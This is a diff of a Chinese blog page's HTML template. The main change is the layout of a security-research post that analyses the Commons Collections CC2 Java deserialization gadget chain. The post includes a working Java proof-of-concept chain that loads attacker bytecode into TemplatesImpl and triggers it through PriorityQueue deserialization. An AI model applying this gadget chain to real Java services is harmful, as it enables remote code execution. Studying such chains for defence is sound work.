@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -104,10 +104,7 @@
   
 
   <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+    <nav id="navbar" class="navbar fixed-top navbar-expand-lg">
   <div class="container">
     <a class="navbar-brand" href="/">
       <strong>Change</strong>
@@ -119,69 +116,53 @@
       <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
 
-    <!-- Collapsible content (desktop) -->
     <div class="collapse navbar-collapse" id="navbarSupportedContent">
       <ul class="navbar-nav ml-auto text-center">
         
           
           
           
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
+          <li class="nav-item">
+            <a class="nav-link" href="/" target="_self">
+              <span>首页</span>
+            </a>
+          </li>
         
           
           
           
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/" target="_self">
+              <span>归档</span>
+            </a>
+          </li>
         
           
           
           
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/" target="_self">
+              <span>分类</span>
+            </a>
+          </li>
         
           
           
           
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/" target="_self">
+              <span>标签</span>
+            </a>
+          </li>
         
           
           
           
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/" target="_self">
+              <span>关于</span>
+            </a>
+          </li>
         
         
           <li class="nav-item" id="search-btn">
@@ -203,197 +184,77 @@
   </div>
 </nav>
 
-<!-- Mobile grid menu overlay -->
-<div id="mobile-grid-menu" class="d-lg-none">
-  <div class="mobile-grid-menu-inner">
-    <div class="container">
-      <div class="row">
-        
-          
-          
-          
-          
-            <div class="col-4 mobile-grid-cell">
-              <a href="/" target="_self">
-                <div class="mobile-grid-item">
-                  <i class="iconfont icon-home-fill"></i>
-                  <span>首页</span>
-                </div>
-              </a>
-            </div>
-          
-        
-          
-          
-          
-          
-            <div class="col-4 mobile-grid-cell">
-              <a href="/archives/" target="_self">
-                <div class="mobile-grid-item">
-                  <i class="iconfont icon-archive-fill"></i>
-                  <span>归档</span>
-                </div>
-              </a>
-            </div>
-          
-        
-          
-          
-          
-          
-            <div class="col-4 mobile-grid-cell">
-              <a href="/categories/" target="_self">
-                <div class="mobile-grid-item">
-                  <i class="iconfont icon-category-fill"></i>
-                  <span>分类</span>
-                </div>
-              </a>
-            </div>
-          
-        
-          
-          
-          
-          
-            <div class="col-4 mobile-grid-cell">
-              <a href="/tags/" target="_self">
-                <div class="mobile-grid-item">
-                  <i class="iconfont icon-tags-fill"></i>
-                  <span>标签</span>
-                </div>
-              </a>
-            </div>
-          
-        
-          
-          
-          
-          
-            <div class="col-4 mobile-grid-cell">
-              <a href="/about/" target="_self">
-                <div class="mobile-grid-item">
-                  <i class="iconfont icon-user-fill"></i>
-                  <span>关于</span>
-                </div>
-              </a>
-            </div>
-          
-        
-        
-          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
-            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <div class="mobile-grid-item">
-                <i class="iconfont icon-search"></i>
-                <span>搜索</span>
-              </div>
-            </a>
-          </div>
-        
-        
-          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
-               data-label-light="开灯"
-               data-label-dark="关灯">
-            <a href="javascript:;" aria-label="Color Toggle">
-              <div class="mobile-grid-item">
-                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
-                <span id="mobile-color-toggle-label">关灯</span>
-              </div>
-            </a>
-          </div>
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="CC2反序列化链分析"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-19 15:30" pubdate>
-          2024年10月19日 下午
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          6.1k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          51 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-
-
-</div>
-
   </header>
 
   <main>
+    <div class="post-container">
+  <article class="post-content">
+  <!-- Post header -->
+  <h1 id="seo-header">CC2反序列化链分析</h1>
+
+  
+    <div class="post-metas">
+      
+        <span class="post-meta">
+          <i class="iconfont icon-date"></i>
+          <time datetime="2024-10-19 15:30" pubdate>
+            2024-10-19
+          </time>
+        </span>
+      
+      
+        <span class="post-meta">
+          <i class="iconfont icon-word"></i>
+          6.1k post.wordcount
+        </span>
+      
+      
+        <span class="post-meta">
+          <i class="iconfont icon-clock"></i>
+          51 post.min2read
+        </span>
+      
+      
+        <span class="post-meta">
+          <i class="iconfont icon-category"></i>
+          
+
+<span class="category-chains">
+  
+  
     
-      
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
+      </span>
+    
+  
+</span>
 
+        </span>
+      
+      
+        <span class="post-meta">
+          <i class="iconfont icon-tags"></i>
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">#安全研究</a>
+          
+        </span>
+      
     </div>
+  
 
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">CC2反序列化链分析</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前几条链子中我们都用到了ChainedTransformer这个类作为辅助来执行Transformer数组里面的方法，而在cc2中，我们将舍弃掉这个类及数组的使用</p>
+  <!-- Updated notice -->
+  
+
+  <!-- Post content -->
+  
+    <div class="markdown-body">
+      
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前几条链子中我们都用到了ChainedTransformer这个类作为辅助来执行Transformer数组里面的方法，而在cc2中，我们将舍弃掉这个类及数组的使用</p>
 <h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p>整体来说跟cc4差不多，区别就是cc2没有用ChainedTransformer和Transformer数组，同时用InvokerTransformer代替了InstantiateTransformer</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">PriorityQueue.readObject()<br>  PriorityQueue.heapify()<br>    PriorityQueue.siftDown()<br>      PriorityQueue.siftDownUsingComparator()<br>        TransformingComparator.compare()         <br>            InvokerTransformer.transform()<br>                    TemplatesImpl.newTransformer  <br></code></pre></td></tr></table></figure>
 
@@ -437,12 +298,14 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class templatesClass=templates.getClass();<br><br>        <span class="hljs-comment">//修改_name</span><br>        Field nameField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;Ch4nge&quot;</span>);<br><br>        <span class="hljs-comment">//修改_tfactory</span><br>        Field tfactoryField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//往_bytecodes传入字节数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">byte</span>[]  bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] bytecodesArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;;<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates, bytecodesArray);<br><br>        <span class="hljs-comment">//调用方法</span><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        <span class="hljs-comment">//        Transformer[] transformers = new Transformer[]&#123;</span><br>        <span class="hljs-comment">//                new ConstantTransformer(TrAXFilter.class),</span><br>        <span class="hljs-comment">//                instantiateTransformer,</span><br>        <span class="hljs-comment">//        &#125;;</span><br>        <span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><br>        <span class="hljs-comment">//实例化TransformingComparator</span><br>        TransformingComparator transformingComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br><br><br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.offer(TrAXFilter.class);<br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//反射传入chainedTransformer</span><br>        Class TransformerClass=transformingComparator.getClass();<br>        Field sizeField=TransformerClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//将chainedTransformer换成instantiateTransformer</span><br>        sizeField.set(transformingComparator,instantiateTransformer);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
+      
+    </div>
+  
+
+  <hr/>
+
+  <div>
+    <div class="post-metas my-3">
   
     <div class="post-meta mr-3 d-flex align-items-center">
       <i class="iconfont icon-category"></i>
@@ -475,8 +338,7 @@
   
 </div>
 
-
-              
+    
   
 
   <div class="license-box my-3">
@@ -521,41 +383,35 @@
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/10/22/CC5/" title="CC5反序列化链分析">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CC5反序列化链分析</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/10/15/CC4/" title="CC4反序列化链分析">
-                        <span class="hidden-mobile">CC4反序列化链分析</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
+    
+      <div class="post-prevnext">
+        <div class="post-prev">
+          
+          
+            <a href="/2024/10/22/CC5/" title="CC5反序列化链分析">
+              <i class="iconfont icon-arrowleft"></i>
+              <span class="hidden-mobile">CC5反序列化链分析</span>
+            </a>
+          
+        </div>
+        <div class="post-next">
+          
+          
+            <a href="/2024/10/15/CC4/" title="CC4反序列化链分析">
+              <span class="hidden-mobile">CC4反序列化链分析</span>
+              <i class="iconfont icon-arrowright"></i>
+            </a>
+          
         </div>
       </div>
-    </div>
+    
+  </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
+  
+</article>
+
+
+  <aside class="post-toc">
     <div id="toc">
   <p class="toc-header">
     <i class="iconfont icon-list"></i>
@@ -568,9 +424,6 @@
 
   </aside>
 
-
-    </div>
-  </div>
 </div>
 
 
@@ -599,18 +452,26 @@
 
 
 
+  </main>
 
+  <footer>
+    <div class="footer-inner">
+  <div>
+    &copy;2026 Change
+  </div>
+  
+    <div>
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+</div>
 
-    
+  </footer>
 
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+  <!-- Search modal -->
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
      aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
@@ -631,23 +492,14 @@
   </div>
 </div>
 
-    
+  
 
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
+  <!-- Scroll to top -->
   
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
+    <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
   
-  
-  
-</div>
-
-  </footer>
 
   <!-- Scripts -->
   
@@ -699,8 +551,8 @@
   Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
     var toc = jQuery('#toc');
     if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
+    var postContent = document.querySelector('.post-content');
+    var contentTop = postContent ? postContent.getBoundingClientRect().top + window.scrollY : 0;
 
     function isExpandAllEnabled() {
       return CONFIG.toc && CONFIG.toc.expand_all === true;
@@ -768,7 +620,7 @@
       collapsibleClass: 'tocbot-is-collapsible',
       scrollSmooth    : true,
       includeTitleTags: true,
-      headingsOffset  : -boardTop,
+      headingsOffset  : -contentTop + 80,
     }, CONFIG.toc);
     if (isExpandAllEnabled()) {
       tocConfig.collapseDepth = 6;
